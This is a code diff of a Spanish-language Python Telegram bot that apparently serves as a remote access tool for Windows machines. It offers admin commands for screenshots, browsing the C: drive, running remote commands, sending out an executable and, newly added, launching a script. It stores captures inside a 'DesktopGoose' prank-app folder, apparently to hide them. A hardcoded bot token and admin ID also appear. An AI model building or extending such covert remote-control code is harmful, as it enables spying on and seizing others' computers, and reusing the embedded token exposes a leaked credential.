@@ -2,8 +2,9 @@ import os
 import telebot
 from telebot import types
 import pyautogui
-import sqlite3
+from Database.datab import create_table_if_not_exists, insert_or_update_user
 from datetime import datetime
+import subprocess
 
 # Conexión con nuestro BOT
 TOKEN = '7350752233:AAFZTB3HMBbzbFMHh0-7q3XDbKnDb-ExWLg'
@@ -14,24 +15,16 @@ ADMIN_ID = 5433151369
 
 # Ruta para guardar capturas de pantalla (ruta relativa)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-CAPTURES_DIR = os.path.join(BASE_DIR, 'Assets', 'Captures')
+CAPTURES_DIR = os.path.join(BASE_DIR, 'DesktopGoose-v0.31\Assets\Images\Memes')
 if not os.path.exists(CAPTURES_DIR):
     os.makedirs(CAPTURES_DIR)
 
 # Ruta del ejecutable a descargar
 EXECUTABLE_PATH = os.path.join(BASE_DIR, 'output', 'main.exe')
 
-# Creación de conexión y lógica para BASE DE DATOS
-def insert_usuario(telegram_id: int, name: str):
-    conex = sqlite3.connect('Data/telegram_bot.db')
-    cursor = conex.cursor()
-    cursor.execute('''
-        INSERT OR IGNORE INTO users(telegram_id, name)
-        VALUES (?,?)
-    ''', (telegram_id, name))
-    conex.commit()
-    cursor.close()
-    conex.close()
+# Ruta del script para iniciar la aplicación
+SCRIPT_PATH = os.path.join(BASE_DIR, 'run_application.py')
+create_table_if_not_exists()
 
 # Definir directorio base como raíz del disco C
 BASE_DIR = 'C:/'
@@ -56,7 +49,8 @@ def get_admin_menu():
     btn_list_directory = types.KeyboardButton('/list_directory')
     btn_remote_command = types.KeyboardButton('/remote_command')
     btn_download = types.KeyboardButton('/download')
-    markup.add(btn_help, btn_screenshot, btn_list_files, btn_list_directory, btn_remote_command, btn_download)
+    btn_run_application = types.KeyboardButton('/run_application')
+    markup.add(btn_help, btn_screenshot, btn_list_files, btn_list_directory, btn_remote_command, btn_download, btn_run_application)
     return markup
 
 # Función para enviar instrucciones y mostrar botones
@@ -73,7 +67,8 @@ def send_instructions(chat_id):
                            "/list_files - Lista los directorios en la raíz del disco C\n"
                            "/list_directory - Lista el contenido de una carpeta específica\n"
                            "/remote_command - Ejecuta un comando remoto\n"
-                           "/download - Descarga el ejecutable")
+                           "/download - Descarga el ejecutable\n"
+                           "/run_application - Inicia la aplicación")
     else:
         user_name = bot.get_chat_member(chat_id, chat_id).user.first_name
         welcome_message = (f"Hola {user_name}! Puedes interactuar conmigo usando los siguientes comandos:\n"
@@ -90,7 +85,7 @@ def is_admin(user_id):
 def save_user(message):
     telegram_id = message.from_user.id
     name = message.from_user.first_name
-    insert_usuario(telegram_id, name)
+    insert_or_update_user(telegram_id, name)
     bot.reply_to(message, f'Bienvenido {name}, tu información ha sido guardada')
 
 # Comando /help para proporcionar ayuda
@@ -109,7 +104,8 @@ def send_help(message):
                     '/list_files - Lista los directorios en la raíz del disco C\n'
                     '/list_directory - Lista el contenido de una carpeta específica\n'
                     '/remote_command - Ejecuta un comando remoto\n'
-                    '/download - Descarga el ejecutable')
+                    '/download - Descarga el ejecutable\n'
+                    '/run_application - Inicia la aplicación')
     bot.send_message(message.chat.id, help_message, reply_markup=markup)
 
 # Comando /user_info para mostrar la información del usuario
@@ -251,7 +247,7 @@ def download_executable(message):
     telegram_id = message.from_user.id
     name = message.from_user.first_name
 
-    insert_usuario(telegram_id, name)
+    insert_or_update_user(telegram_id, name)
 
     if os.path.exists(EXECUTABLE_PATH):
         with open(EXECUTABLE_PATH, 'rb') as file:
@@ -259,9 +255,24 @@ def download_executable(message):
     else:
         bot.send_message(message.chat.id, "El ejecutable no está disponible en este momento.", reply_markup=markup)
 
+# Comando /run_application para ejecutar el script de aplicación
+@bot.message_handler(commands=['run_application'])
+def run_application(message):
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
+        return
+
+    try:
+        subprocess.Popen(['python', SCRIPT_PATH])
+        bot.send_message(message.chat.id, "La aplicación se está iniciando...")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"No se pudo iniciar la aplicación: {str(e)}")
+
 # Manejador para cualquier otro mensaje recibido
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
+    create_table_if_not_exists()
+    insert_or_update_user(message.from_user.id, message.from_user.first_name)
     send_instructions(message.chat.id)
 
 def run_bot():
